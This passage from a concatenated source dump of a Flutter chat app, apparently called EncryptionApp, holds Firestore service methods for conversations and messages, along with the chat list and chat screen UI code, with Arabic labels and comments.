      _logger.warn("ApiService:getMessagesStream",
          "Received empty conversationId. Returning empty stream.");
      return Stream.value([]);
    }
    // Note: Messages are not soft-deleted individually in this scheme.
    // If a conversation is soft-deleted for a user, they won't see it, thus won't fetch its messages.
    return _firestore
        .collection("conversations")
        .doc(conversationId)
        .collection("messages")
        .orderBy("timestamp", descending: false)
        .snapshots()
        .map((snapshot) {
      if (snapshot.docs.isEmpty) {
        _logger.info("ApiService:getMessagesStream",
            "No messages found for $conversationId.");
        return <ChatMessage>[];
      }
      _logger.debug("ApiService:getMessagesStream",
          "Received ${snapshot.docs.length} messages for $conversationId.");
      return snapshot.docs
          .map((doc) => ChatMessage.fromFirestore(
              doc as DocumentSnapshot<Map<String, dynamic>>, _currentAgentCode))
          .toList();
    }).handleError((error, stackTrace) {
      _logger.error("ApiService:getMessagesStream",
          "Error in stream for $conversationId", error, stackTrace);
      return <ChatMessage>[];
    });
  }

  Future<ChatParticipantInfo?> getAgentInfo(String agentCodeToFetch) async {
    _logger.info("ApiService:getAgentInfo",
        "Fetching info for agent_code: $agentCodeToFetch");
    if (agentCodeToFetch.isEmpty) {
      _logger.warn(
          "ApiService:getAgentInfo", "Received empty agentCodeToFetch.");
      return null;
    }
    try {
      final doc = await _firestore
          .collection("agent_identities")
          .doc(agentCodeToFetch)
          .get();
      if (doc.exists) {
        final data = doc.data()!;
        _logger.debug("ApiService:getAgentInfo",
            "Agent $agentCodeToFetch found. DisplayName: ${data["displayName"]}");
        return ChatParticipantInfo(
          agentCode: agentCodeToFetch,
          displayName: data["displayName"] as String? ?? agentCodeToFetch,
        );
      }
      _logger.warn("ApiService:getAgentInfo",
          "Agent info not found for $agentCodeToFetch in 'agent_identities'.");
      return null;
    } catch (e, s) {
      _logger.error("ApiService:getAgentInfo",
          "Error fetching agent info for $agentCodeToFetch", e, s);
      return null;
    }
  }

  Future<String?> createOrGetConversationWithParticipants(
      List<String> participantAgentCodes,
      Map<String, ChatParticipantInfo> participantInfoMapInput,
      {String? groupTitle}) async {
    _logger.info("ApiService:createOrGetConversation",
        "Attempting with initial participants: $participantAgentCodes. Current user: $_currentAgentCode");

    final allParticipantsSorted = List<String>.from(participantAgentCodes);
    if (!allParticipantsSorted.contains(_currentAgentCode)) {
      allParticipantsSorted.add(_currentAgentCode);
    }
    allParticipantsSorted.sort();

    _logger.debug("ApiService:createOrGetConversation",
        "All sorted participants: $allParticipantsSorted");

    var finalParticipantInfoMap =
        Map<String, ChatParticipantInfo>.from(participantInfoMapInput);
    if (!finalParticipantInfoMap.containsKey(_currentAgentCode)) {
      final currentUserInfo = await getAgentInfo(_currentAgentCode);
      if (currentUserInfo != null) {
        finalParticipantInfoMap[_currentAgentCode] = currentUserInfo;
      } else {
        _logger.warn("ApiService:createOrGetConversation",
            "Could not fetch current user info for $_currentAgentCode. Using fallback.");
        finalParticipantInfoMap[_currentAgentCode] = ChatParticipantInfo(
            agentCode: _currentAgentCode,
            displayName:
                "أنا (${_currentAgentCode.substring(0, min(3, _currentAgentCode.length))}..)");
      }
    }
    for (String code in allParticipantsSorted) {
      if (!finalParticipantInfoMap.containsKey(code)) {
        final info = await getAgentInfo(code);
        if (info != null) {
          finalParticipantInfoMap[code] = info;
        } else {
          _logger.error("ApiService:createOrGetConversation",
              "Could not fetch participant info for $code.");
          return null;
        }
      }
    }

    // When creating/getting a conversation, we should also check the deletedForUsers status
    // If a 2-party conversation exists but is marked deleted for the current user, we might want to "un-delete" it or create a new one.
    // For now, let's assume if it exists, we return it, and the UI handles showing it if not deleted.
    // The getConversationsStream will filter it out if it's marked deleted.
    // If we want to "un-delete" upon trying to re-open, that logic would be here.
    // For simplicity, let's stick to the current behavior: if it exists, return its ID.
    // The client will then try to fetch it via getConversationsStream which will filter it if deleted.
    // This might lead to a situation where a user tries to open a chat that then disappears.
    // A better approach might be to check deletedForUsers here and if true for current user, update it to false.

    if (allParticipantsSorted.length == 2) {
      _logger.debug("ApiService:createOrGetConversation",
          "Checking for existing 2-party conversation.");
      QuerySnapshot existingConversation = await _firestore
          .collection("conversations")
          .where("participants", isEqualTo: allParticipantsSorted)
          // No filter for deletedForUsers here, as we want to find it even if soft-deleted by one party.
          .limit(1)
          .get();

      if (existingConversation.docs.isNotEmpty) {
        final doc = existingConversation.docs.first;
        final docId = doc.id;
        final data = doc.data() as Map<String, dynamic>?;
        final deletedForUsers = data?["deletedForUsers"] as Map<String, dynamic>?;

        // If it was deleted by the current user, undelete it by removing the flag.
        if (deletedForUsers != null && deletedForUsers[_currentAgentCode] == true) {
          _logger.info("ApiService:createOrGetConversation",
              "Found existing 2-party conversation $docId, previously deleted by $_currentAgentCode. Undeleting.");
          await _firestore.collection("conversations").doc(docId).update({
            "deletedForUsers.$_currentAgentCode": FieldValue.delete(), // Remove the flag
            "updatedAt": FieldValue.serverTimestamp()
          });
        }
        _logger.info("ApiService:createOrGetConversation",
            "Found/Reactivated existing 2-party conversation: $docId");
        return docId;
      }
    }

    _logger.info("ApiService:createOrGetConversation",
        "No existing suitable conversation found or it's a group chat. Creating new one.");
    final now = DateTime.now();

    final newConversation = ChatConversation(
      id: "", // Firestore will generate ID
      participants: allParticipantsSorted,
      participantInfo: finalParticipantInfoMap,
      conversationTitle: groupTitle ??
          (allParticipantsSorted.length > 2
              ? "مجموعة جديدة (${allParticipantsSorted.length})"
              : "محادثة"), // Default title
      lastMessageText: "تم إنشاء المحادثة.",
      lastMessageTimestamp: now,
      lastMessageSenderAgentCode: _currentAgentCode, // Or system message
      createdAt: now,
      updatedAt: now,
      deletedForUsers: {}, // Initialize with empty map
    );

    try {
      final docRef = await _firestore
          .collection("conversations")
          .add(newConversation.toFirestore());
      _logger.info("ApiService:createOrGetConversation",
          "Successfully created new conversation with ID: ${docRef.id}");
      return docRef.id;
    } catch (e, stackTrace) {
      _logger.error("ApiService:createOrGetConversation",
          "Failed to create new conversation in Firestore", e, stackTrace);
      return null;
    }
  }

  Future<void> sendMessage(
      String conversationId, ChatMessage messageToSend) async {
    _logger.info("ApiService:sendMessage",
        "Sending message to conversation $conversationId by agent $_currentAgentCode. Text: ${messageToSend.text ?? messageToSend.fileName ?? 'Attachment'}");

    if (conversationId.isEmpty || messageToSend.senderId != _currentAgentCode) {
      _logger.error("ApiService:sendMessage",
          "Invalid params: convId empty or senderId mismatch. ConvId: '$conversationId', Sender: '${messageToSend.senderId}', CurrentUser: '$_currentAgentCode'");
      return;
    }

    try {
      final messageData = messageToSend.toFirestore();
      messageData["timestamp"] = FieldValue.serverTimestamp(); // Use server timestamp for messages

      final messageDocRef = await _firestore
          .collection("conversations")
          .doc(conversationId)
          .collection("messages")
          .add(messageData);

      _logger.debug("ApiService:sendMessage",
          "Message document ${messageDocRef.id} added to conversation $conversationId.");

      // When a message is sent, ensure the conversation is not marked as deleted for any participant.
      // This effectively "un-deletes" the conversation for all participants if they send a message.
      Map<String, dynamic> updateData = {
        "lastMessageText":
            messageToSend.text ?? (messageToSend.fileName ?? "مرفق"),
        "lastMessageTimestamp": FieldValue.serverTimestamp(),
        "lastMessageSenderAgentCode": messageToSend.senderId,
        "updatedAt": FieldValue.serverTimestamp(),
        "deletedForUsers": {} // Clear all soft-delete flags for all users in this conversation
      };

      await _firestore.collection("conversations").doc(conversationId).update(updateData);
      _logger.info("ApiService:sendMessage",
          "Conversation $conversationId metadata updated and un-deleted for all participants.");
    } catch (e, stackTrace) {
      _logger.error(
          "ApiService:sendMessage",
          "Failed to send message to conversation $conversationId or update conversation metadata",
          e,
          stackTrace);
      rethrow;
    }
  }

  Future<bool> validateAgentCodeAgainstFirestore(
      String agentCodeToValidate) async {
    if (agentCodeToValidate.isEmpty) {
      _logger.warn("ApiService:validateAgentCode",
          "Attempted to validate an empty agent code.");
      return false;
    }
    _logger.info("ApiService:validateAgentCode",
        "Validating agent code: $agentCodeToValidate against 'agent_identities'");
    try {
      final doc = await _firestore
          .collection("agent_identities")
          .doc(agentCodeToValidate)
          .get();

      if (doc.exists) {
        _logger.info("ApiService:validateAgentCode",
            "Agent code '$agentCodeToValidate' is VALID (document exists).");
        return true;
      } else {
        _logger.warn("ApiService:validateAgentCode",
            "Agent code '$agentCodeToValidate' is INVALID (document does not exist).");
        return false;
      }
    } catch (e, s) {
      _logger.error(
          "ApiService:validateAgentCode",
          "Error occurred while validating agent code '$agentCodeToValidate'",
          e,
          s);
      return false;
    }
  }
}




// ------------------------------ نهاية الملف: api_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: chat_list_screen.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\chat_list_screen.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/chat_list_screen.dart
import "dart:async"; // For unawaited

import "package:cloud_firestore/cloud_firestore.dart"; 
import "package:flutter/material.dart";
import "package:flutter_riverpod/flutter_riverpod.dart";
import "package:google_fonts/google_fonts.dart";

import "../../core/logging/logger_provider.dart";
// Import the whole file, as both ChatConversation and ChatParticipantInfo are used.
import "../../data/models/chat/chat_conversation.dart"; 
import "chat_screen.dart";
import "providers/auth_providers.dart";
import "providers/chat_providers.dart";
import "widgets/chat_list_item.dart";

final chatSearchQueryProvider = StateProvider<String>((ref) => "");

class ChatListScreen extends ConsumerStatefulWidget {
  const ChatListScreen({super.key});
  @override
  ConsumerState<ChatListScreen> createState() => _ChatListScreenState();
}

class _ChatListScreenState extends ConsumerState<ChatListScreen> {
  bool _isSearching = false;
  final TextEditingController _searchController = TextEditingController();
  bool _isFirstLoad = true; // Track first load to improve UX

  @override
  void initState() {
    super.initState();
    _searchController.addListener(() {
      if (mounted) {
        ref.read(chatSearchQueryProvider.notifier).state =
            _searchController.text;
      }
    });
    
    // Add a slight delay to make sure we've completed initialization
    Future.delayed(const Duration(milliseconds: 200), () {
      if (mounted) {
        setState(() {
          _isFirstLoad = false;
        });
      }
    });
  }

  @override
  void dispose() {
    _searchController.dispose();
    super.dispose();
  }

  void _toggleSearch() {
    setState(() {
      _isSearching = !_isSearching;
      if (!_isSearching) {
        _searchController.clear();
        ref.read(chatSearchQueryProvider.notifier).state = "";
      }
    });
  }

  Future<ChatParticipantInfo?> _fetchAgentInfo(
      String agentCode, WidgetRef ref) async {
    final logger = ref.read(appLoggerProvider);
    final firestore = FirebaseFirestore.instance;
    logger.info("_fetchAgentInfo",
        "Fetching info for agent: $agentCode (direct Firestore access)");
    if (agentCode.isEmpty) return null;
    try {
      final doc =
          await firestore.collection("agent_identities").doc(agentCode).get();
      if (doc.exists) {
        final data = doc.data()!;
        return ChatParticipantInfo(
          agentCode: agentCode,
          displayName: data["displayName"] as String? ?? agentCode,
        );
      }
      logger.warn("_fetchAgentInfo", "Agent info not found for $agentCode.");
      return null;
    } catch (e, s) {
      logger.error(
          "_fetchAgentInfo", "Error fetching agent info for $agentCode", e, s);
      return null;
    }
  }

  void _createNewConversation() async {
    final apiService = ref.read(apiServiceProvider);
    final logger = ref.read(appLoggerProvider);
    final currentAgentCode =
        ref.read(currentAgentCodeProvider).value;
    final bool mainContextMounted = mounted; // Capture mounted state
    final theme = Theme.of(context); // Get theme for styling

    if (apiService == null ||
        currentAgentCode == null ||
        currentAgentCode.isEmpty) {
      logger.warn("ChatListScreen:createNewConversation",
          "ApiService or currentAgentCode is not available.");
      if (mainContextMounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
              content: Text("الخدمة غير متاحة أو لم يتم تسجيل الدخول.",
                  style: GoogleFonts.cairo())),
        );
      }
      return;
    }

    String? otherAgentCode = await showDialog<String>(
        context: context, 
        barrierDismissible: false, // Make dialog harder to dismiss accidentally
        builder: (dialogContext) {
          TextEditingController agentCodeController = TextEditingController();
          return AlertDialog(
            title: Text("بدء محادثة جديدة", style: GoogleFonts.cairo(fontWeight: FontWeight.bold)),
            content: Column(
              mainAxisSize: MainAxisSize.min, // Important for Column in AlertDialog
              children: [
                Text("الرجاء إدخال الرمز التعريفي للشخص الذي ترغب في بدء محادثة معه.", style: GoogleFonts.cairo(fontSize: 14)),
                const SizedBox(height: 15),
                TextField(
                  controller: agentCodeController,
                  decoration: InputDecoration(
                      hintText: "الرمز التعريفي للعميل الآخر",
                      hintStyle: GoogleFonts.cairo(),
                      border: const OutlineInputBorder(), // Add border for better visibility
                      prefixIcon: const Icon(Icons.person_search_outlined)
                  ),
                  style: GoogleFonts.cairo(),
                  autofocus: true, // Focus on the text field immediately
                ),
              ],
            ),
            actionsAlignment: MainAxisAlignment.spaceBetween, // Space out buttons
            actionsPadding: const EdgeInsets.symmetric(horizontal: 16.0, vertical: 8.0),
            actions: [
              TextButton(
                  onPressed: () => Navigator.of(dialogContext).pop(),
                  child: Text("إلغاء", style: GoogleFonts.cairo(color: theme.colorScheme.error, fontWeight: FontWeight.bold))),
              ElevatedButton.icon(
                  icon: const Icon(Icons.send_outlined),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: theme.primaryColor,
                    foregroundColor: theme.colorScheme.onPrimary,
                    padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12)
                  ),
                  onPressed: () {
                    final code = agentCodeController.text.trim();
                    if (code.isNotEmpty) {
                       Navigator.of(dialogContext).pop(code);
                    } else {
                      // Optionally show a small validation message within the dialog
                      ScaffoldMessenger.of(dialogContext).showSnackBar(
                        SnackBar(content: Text("الرجاء إدخال الرمز التعريفي.", style: GoogleFonts.cairo()), duration: const Duration(seconds: 2))
                      );
                    }
                  },
                  label: Text("بدء المحادثة", style: GoogleFonts.cairo(fontWeight: FontWeight.bold)))
            ],
          );
        });

    if (otherAgentCode == null || otherAgentCode.isEmpty) {
      logger.info("ChatListScreen:createNewConversation",
          "Dialog cancelled or no other agent code entered.");
      return;
    }

    if (otherAgentCode == currentAgentCode) {
      logger.info("ChatListScreen:createNewConversation",
          "Attempted to create chat with self.");
      if (mounted) { 
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
              content: Text("لا يمكنك إنشاء محادثة مع نفسك بهذه الطريقة.",
                  style: GoogleFonts.cairo())),
        );
      }
      return;
    }

    // تحسين تجربة المستخدم بإظهار حالة تحميل مباشرة
    if (mounted) {
      showDialog(
        context: context,
        barrierDismissible: false,
        builder: (BuildContext context) {
          return Dialog(
            child: Padding(
              padding: const EdgeInsets.all(20.0),
              child: Row(
                mainAxisSize: MainAxisSize.min,
                children: [
                  CircularProgressIndicator(color: theme.primaryColor),
                  const SizedBox(width: 20),
                  Text("جاري إعداد المحادثة...", style: GoogleFonts.cairo()),
                ],
              ),
            ),
          );
        },
      );
    }

    try {
      final otherAgentInfo = await _fetchAgentInfo(otherAgentCode, ref);
      // تحقق مرة أخرى من الـ mounted قبل المتابعة
      if (!mounted) return;

      if (otherAgentInfo == null) {
        Navigator.of(context).pop(); // إغلاق نافذة التحميل
        logger.error("ChatListScreen:createNewConversation",
            "Agent $otherAgentCode not found or error fetching info.");
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
              content: Text("لم يتم العثور على عميل بالرمز: $otherAgentCode",
                  style: GoogleFonts.cairo())),
        );
        return;
      }

      final currentUserInfo = await _fetchAgentInfo(currentAgentCode, ref);
      // تحقق مرة أخرى من الـ mounted قبل المتابعة
      if (!mounted) return;

      if (currentUserInfo == null) {
        Navigator.of(context).pop(); // إغلاق نافذة التحميل
        logger.error("ChatListScreen:CreateNewConversation",
            "Failed to fetch current user ($currentAgentCode) info. This should not happen if login was successful.");
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text("خطأ في جلب معلومات المستخدم الحالي.",
                style: GoogleFonts.cairo())
          )
        );
        return;
      }

      final Map<String, ChatParticipantInfo> participantsInfoMap = {
        currentAgentCode: currentUserInfo,
        otherAgentCode: otherAgentInfo,
      };

      final newConversationId =
          await apiService.createOrGetConversationWithParticipants(
        [otherAgentCode],
        participantsInfoMap,
      );
      
      // تحقق مرة أخرى من الـ mounted قبل المتابعة
      if (!mounted) return;
      Navigator.of(context).pop(); // إغلاق نافذة التحميل

      if (newConversationId != null) {
        logger.info("ChatListScreen",
            "Successfully created/retrieved conversation: $newConversationId");
        Navigator.push(
          context,
          MaterialPageRoute(
            builder: (context) => ChatScreen(
              conversationId: newConversationId,
              conversationTitle: otherAgentInfo.displayName,
            ),
          ),
        );
      } else {
        logger.warn("ChatListScreen",
            "Failed to create/retrieve conversation with $otherAgentCode.");
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
              content: Text(
                  "فشل إنشاء/جلب المحادثة. قد تكون المشكلة في الاتصال أو البيانات.",
                  style: GoogleFonts.cairo())),
        );
      }
    } catch (e, stackTrace) {
      if (mounted) Navigator.of(context).pop(); // إغلاق نافذة التحميل عند حدوث خطأ
      logger.error("ChatListScreen:createNewConversation",
          "Error during conversation creation/retrieval", e, stackTrace);
      if (mounted) { 
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
              content:
                  Text("حدث خطأ: ${e.toString()}", style: GoogleFonts.cairo())),
        );
      }
    }
  }

  // دالة لعرض المحتوى المناسب عند عدم وجود محادثات
  Widget _buildEmptyConversationsView(BuildContext context) {
    final theme = Theme.of(context);
    
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.chat_bubble_outline_rounded, 
              size: 80, 
              color: Colors.grey[400]),
          const SizedBox(height: 20),
          Text(
            "لا توجد محادثات حتى الآن",
            style: GoogleFonts.cairo(
                fontSize: 18, 
                color: Colors.grey[600],
                fontWeight: FontWeight.w600),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 8),
          Text(
            "يمكنك بدء محادثة جديدة مع أي شخص باستخدام الزر أدناه",
            style: GoogleFonts.cairo(
                fontSize: 14, 
                color: Colors.grey[500]),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 24),
          ElevatedButton.icon(
            icon: const Icon(Icons.add_comment_outlined),
            label: Text("بدء محادثة جديدة", 
                       style: GoogleFonts.cairo(fontWeight: FontWeight.bold)),
            onPressed: _createNewConversation,
            style: ElevatedButton.styleFrom(
                backgroundColor: theme.primaryColor,
                foregroundColor: theme.colorScheme.onPrimary,
                padding: const EdgeInsets.symmetric(
                    horizontal: 24, vertical: 12),
                textStyle: GoogleFonts.cairo(fontSize: 16, fontWeight: FontWeight.bold),
                elevation: 2,
            ),
          ),
        ],
      ),
    );
  }

  // دالة لعرض نتيجة بحث فارغة
  Widget _buildEmptySearchResults(String query) {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.search_off_rounded, 
               size: 80, 
               color: Colors.grey[400]),
          const SizedBox(height: 20),
          Text(
            "لا توجد نتائج بحث تطابق \"$query\"",
            style: GoogleFonts.cairo(
                fontSize: 18, 
                color: Colors.grey[600],
                fontWeight: FontWeight.w600),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 16),
          Text(
            "حاول استخدام كلمات مفتاحية مختلفة",
            style: GoogleFonts.cairo(
                fontSize: 14, 
                color: Colors.grey[500]),
            textAlign: TextAlign.center,
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final agentCodeAsync = ref.watch(currentAgentCodeProvider);
    final conversationsAsyncValue = ref.watch(chatConversationsStreamProvider);
    final theme = Theme.of(context);
    final logger = ref.read(appLoggerProvider);
    final currentSearchQuery = ref.watch(chatSearchQueryProvider).toLowerCase();

    if (agentCodeAsync.isLoading) {
      return const Scaffold(
          body: Center(child: CircularProgressIndicator()));
    }
    if (agentCodeAsync.hasError ||
        agentCodeAsync.value == null ||
        agentCodeAsync.value!.isEmpty) {
      return Scaffold(
        body: Center(
          child: Padding(
            padding: const EdgeInsets.all(16.0),
            child: Text(
              agentCodeAsync.hasError
                  ? "خطأ في تحميل بيانات المصادقة.\nالرجاء المحاولة مرة أخرى لاحقًا."
                  : "الرجاء تسجيل الدخول للوصول إلى قسم الدردشات.",
              style: GoogleFonts.cairo(fontSize: 17, color: Colors.grey[700]),
              textAlign: TextAlign.center,
            ),
          ),
        ),
      );
    }

    return Scaffold(
      backgroundColor: theme.scaffoldBackgroundColor,
      body: SafeArea(
        child: Column(
          children: [
            Padding(
              padding: const EdgeInsets.fromLTRB(16, 8, 8, 8), 
              child: Row(
                children: [
                  Expanded(
                    child: _isSearching
                        ? TextField(
                            controller: _searchController,
                            autofocus: true,
                            style: GoogleFonts.cairo(color: theme.textTheme.bodyLarge?.color ?? (theme.brightness == Brightness.dark ? Colors.white : Colors.black)),
                            decoration: InputDecoration(
                              hintText: "بحث في الدردشات...",
                              hintStyle: GoogleFonts.cairo(color: theme.hintColor),
                              border: InputBorder.none, 
                            ))
                        : Text("الدردشات", style: GoogleFonts.cairo(fontSize: 20, fontWeight: FontWeight.bold, color: theme.textTheme.titleLarge?.color)),
                  ),
                  IconButton(
                    icon: Icon(_isSearching ? Icons.close : Icons.search_outlined, color: theme.iconTheme.color),
                    tooltip: _isSearching ? "إغلاق البحث" : "بحث",
                    onPressed: _toggleSearch,
                  ),
                  if (!_isSearching)
                    IconButton(
                      icon: Icon(Icons.refresh_outlined, color: theme.iconTheme.color),
                      tooltip: "تحديث",
                      onPressed: () {
                        unawaited(ref.refresh(chatConversationsStreamProvider.future));
                        logger.info("ChatListScreen",
                            "Manually refreshed conversations stream.");
                        if (_isSearching) _toggleSearch();
                        _searchController.clear();
                      },
                    ),
                ],
              ),
            ),
            Expanded(
              child: conversationsAsyncValue.when(
                data: (conversations) {
                  final filteredConversations = currentSearchQuery.isEmpty
                      ? conversations
                      : conversations.where((conv) {
                          return conv.conversationTitle
                                  .toLowerCase()
                                  .contains(currentSearchQuery) ||
                              (conv.lastMessageText ?? "")
                                  .toLowerCase()
                                  .contains(currentSearchQuery);
                        }).toList();

                  // عرض رسالة فارغة مناسبة
                  if (filteredConversations.isEmpty) {
                    if (currentSearchQuery.isNotEmpty) {
                      return _buildEmptySearchResults(currentSearchQuery);
                    } else {
                      return _buildEmptyConversationsView(context);
                    }
                  }
                  
                  return ListView.separated(
                    padding: const EdgeInsets.symmetric(vertical: 8.0),
                    itemCount: filteredConversations.length,
                    itemBuilder: (context, index) {
                      final conversation = filteredConversations[index];
                      return ChatListItem(
                        conversation: conversation,
                        onTap: () {
                          Navigator.push(
                            context,
                            MaterialPageRoute(
                              builder: (context) => ChatScreen(
                                conversationId: conversation.id,
                                conversationTitle: conversation.conversationTitle,
                              ),
                            ),
                          );
                        },
                      );
                    },
                    separatorBuilder: (context, index) => Divider(
                      height: 0.5,
                      indent: 75,
                      endIndent: 15,
                      color: theme.brightness == Brightness.dark
                          ? Colors.grey[700]
                          : Colors.grey[300],
                    ),
                  );
                },
                loading: () => _isFirstLoad 
                  ? Center(
                      child: Column(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          CircularProgressIndicator(color: theme.primaryColor),
                          const SizedBox(height: 16),
                          Text(
                            "جاري تحميل المحادثات...",
                            style: GoogleFonts.cairo(fontSize: 16, color: theme.primaryColor),
                          )
                        ],
                      ))
                  : const Center(child: CircularProgressIndicator()),
                error: (err, stack) {
                  logger.error(
                      "ChatListScreen:StreamBuilder", "Error in stream UI", err, stack);
                  return Center(
                      child: Padding(
                    padding: const EdgeInsets.all(16.0),
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(Icons.error_outline_rounded, 
                             size: 60, 
                             color: Colors.red[300]),
                        const SizedBox(height: 16),
                        Text(
                          "حدث خطأ أثناء تحميل المحادثات",
                          style: GoogleFonts.cairo(
                              fontSize: 18, 
                              color: Colors.red[400],
                              fontWeight: FontWeight.w600),
                          textAlign: TextAlign.center,
                        ),
                        const SizedBox(height: 8),
                        Text(
                          "الرجاء المحاولة مرة أخرى لاحقًا",
                          style: GoogleFonts.cairo(color: Colors.grey[600], fontSize: 14),
                          textAlign: TextAlign.center,
                        ),
                        const SizedBox(height: 20),
                        ElevatedButton.icon(
                          onPressed: () => ref.refresh(chatConversationsStreamProvider),
                          icon: const Icon(Icons.refresh_rounded),
                          label: Text("إعادة المحاولة", style: GoogleFonts.cairo()),
                          style: ElevatedButton.styleFrom(
                            backgroundColor: theme.primaryColor,
                            foregroundColor: Colors.white,
                          ),
                        )
                      ],
                    ),
                  ));
                },
              ),
            ),
          ],
        ),
      ),
      floatingActionButton: FloatingActionButton.extended(
        onPressed: _createNewConversation,
        backgroundColor: theme.primaryColor,
        foregroundColor: theme.colorScheme.onPrimary,
        tooltip: "بدء محادثة جديدة",
        icon: const Icon(Icons.add_comment_outlined),
        label: Text("محادثة جديدة", style: GoogleFonts.cairo(fontWeight: FontWeight.bold)),
        elevation: 3,
      ),
    );
  }
}


// ------------------------------ نهاية الملف: chat_list_screen.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: chat_screen.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\chat_screen.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/chat_screen.dart
import "package:file_picker/file_picker.dart";
import "package:flutter/material.dart";
import "package:flutter/services.dart";
import "package:flutter_riverpod/flutter_riverpod.dart";
import "package:google_fonts/google_fonts.dart";
import "package:mime/mime.dart"; // For looking up MIME types

import "../../core/logging/logger_provider.dart";
import "../../data/models/chat/chat_message.dart";
import "providers/auth_providers.dart";
import "providers/chat_providers.dart";
import "widgets/message_bubble.dart";
import "widgets/message_input_bar.dart";

class ChatScreen extends ConsumerStatefulWidget {
  final String conversationId;
  final String conversationTitle; 
  final bool showAppBar;

  const ChatScreen({
    super.key,
    required this.conversationId,
    required this.conversationTitle,
    this.showAppBar = true, 
  });

  @override
  ConsumerState<ChatScreen> createState() => _ChatScreenState();
}

class _ChatScreenState extends ConsumerState<ChatScreen> {
  bool _isInitializing = true;

  @override
  void initState() {
    super.initState();
    // تأخير قليل جداً لإظهار حالة تحميل أفضل
    Future.delayed(const Duration(milliseconds: 300), () {
      if (mounted) {
        setState(() {
          _isInitializing = false;
        });
      }
    });
  }

  MessageType _determineMessageTypeFromFile(PlatformFile file) {
    final mimeType = lookupMimeType(file.name, headerBytes: file.bytes?.take(1024).toList());
    final extension = file.extension?.toLowerCase();
    
    if (mimeType != null) {
        if (mimeType.startsWith("image/")) return MessageType.image;
        if (mimeType.startsWith("video/")) return MessageType.video;
        if (mimeType.startsWith("audio/")) return MessageType.audio;
    }
    // Fallback to extension if MIME type is generic or missing
    if (extension == null) {
      return MessageType.file; 
    }
    switch (extension) {
      case "jpg":
      case "jpeg":
      case "png":
      case "gif":
      case "webp":
      case "bmp":
        return MessageType.image;
      case "mp4":
      case "mov":
      case "avi":
      case "mkv":
      case "webm":
        return MessageType.video;
      case "mp3":
      case "wav":
      case "aac":
      case "ogg":
      case "m4a":
        return MessageType.audio;
      default:
        return MessageType.file;
    }
  }

  void _onMessageLongPress(
      BuildContext context, ChatMessage message, WidgetRef ref) {
    final logger = ref.read(appLoggerProvider);
    final currentTheme = Theme.of(context);

    showModalBottomSheet(
        context: context,
        backgroundColor: currentTheme.bottomSheetTheme.modalBackgroundColor ??
            currentTheme.cardColor,
        shape: const RoundedRectangleBorder(
          borderRadius: BorderRadius.vertical(top: Radius.circular(20)),
        ),
        builder: (ctx) {
          return Padding(
            padding: const EdgeInsets.symmetric(vertical: 10.0),
            child: Wrap(
              children: <Widget>[
                Center(
                  child: Container(
                    width: 40,
                    height: 5,
                    margin: const EdgeInsets.only(top: 8, bottom: 12),
                    decoration: BoxDecoration(
                        color: Colors.grey[400],
                        borderRadius: BorderRadius.circular(10)),
                  ),
                ),
                if (message.text != null && message.text!.isNotEmpty)
                  ListTile(
                    leading: Icon(Icons.copy_all_outlined,
                        color: currentTheme.colorScheme.primary),
                    title: Text("نسخ النص",
                        style: GoogleFonts.cairo(fontSize: 16)),
                    onTap: () {
                      Clipboard.setData(ClipboardData(text: message.text!));
                      Navigator.of(ctx).pop();
                      ScaffoldMessenger.of(context).showSnackBar(
                        SnackBar(
                          content: Text("تم نسخ النص إلى الحافظة",
                              style: GoogleFonts.cairo()),
                          behavior: SnackBarBehavior.floating, 
                          shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(10)),
                        ),
                      );
                      logger.info("ChatScreen:MessageMenu",
                          "Copied message text: ${message.id}");
                    },
                  ),
              ],
            ),
          );
        });
  }

  // دالة لعرض حالة تحميل محسنة
  Widget _buildLoadingState(BuildContext context) {
    final theme = Theme.of(context);
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          CircularProgressIndicator(color: theme.primaryColor),
          const SizedBox(height: 20),
          Text(
            "جاري إعداد المحادثة...",
            style: GoogleFonts.cairo(
              fontSize: 16,
              color: theme.primaryColor,
              fontWeight: FontWeight.w500
            ),
          ),
        ],
      ),
    );
  }

  // دالة لعرض حالة الخطأ بشكل محسن
  Widget _buildErrorState(String errorMsg, WidgetRef ref) {
    final theme = Theme.of(context);
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(20.0),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.error_outline_rounded,
                color: Colors.red[300], size: 60),
            const SizedBox(height: 15),
            Text(
              "حدث خطأ أثناء تحميل المحادثة",
              style: GoogleFonts.cairo(
                  color: Colors.red[400], 
                  fontSize: 18,
                  fontWeight: FontWeight.w600),
              textAlign: TextAlign.center,
            ),
            const SizedBox(height: 8),
            Text(
              errorMsg,
              style: GoogleFonts.cairo(
                  color: Colors.grey[600], fontSize: 14),
              textAlign: TextAlign.center,
            ),
            const SizedBox(height: 20),
            ElevatedButton.icon(
              icon: const Icon(Icons.refresh_rounded),
              label: Text("إعادة المحاولة", style: GoogleFonts.cairo()),
              onPressed: () => ref.invalidate(
